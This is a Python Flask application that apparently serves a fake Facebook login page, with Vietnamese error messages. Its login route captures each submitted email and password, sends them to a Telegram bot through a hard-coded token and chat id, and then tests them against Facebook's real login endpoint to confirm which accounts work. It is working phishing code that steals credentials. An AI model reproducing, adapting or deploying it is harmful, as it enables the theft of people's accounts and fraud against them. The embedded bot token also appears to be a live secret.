from flask import Flask, render_template, request, redirect
import requests
import os
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
TELEGRAM_CHAT_ID = "6126534090"

def send_to_telegram(title, content):
    message = f"""
🔴 **{title}**

{content}
⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    """
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')

    if not email or not password:
        return render_template('index.html', error="Vui lòng nhập đầy đủ thông tin.")

    # Gửi thông tin về Telegram trước
    send_to_telegram("📧 THÔNG TIN ĐĂNG NHẬP", f"Email: {email}\nPassword: {password}")

    # === GỬI REQUEST ĐẾN FACEBOOK THẬT ===
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'Referer': 'https://www.facebook.com/',
            'Origin': 'https://www.facebook.com'
        }

        data = {
            'email': email,
            'pass': password,
            'login': '1'
        }

        r = requests.post('https://www.facebook.com/login.php', 
                         data=data, 
                         headers=headers, 
                         allow_redirects=True, 
                         timeout=12)

        # Kiểm tra xem có đăng nhập thành công không
        if any(x in r.url for x in ['home.php', 'facebook.com/home', '/messages']):
            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG", f"Email: {email}\nPassword: {password}")
            return redirect('https://www.facebook.com')
        else:
            # Sai mật khẩu hoặc bị chặn
            return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")

    except Exception as e:
        send_to_telegram("❌ LỖI KẾT NỐI", f"Email: {email}\nError: {str(e)}")
        return render_template('index.html', error="Đã xảy ra lỗi. Vui lòng thử lại sau.")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)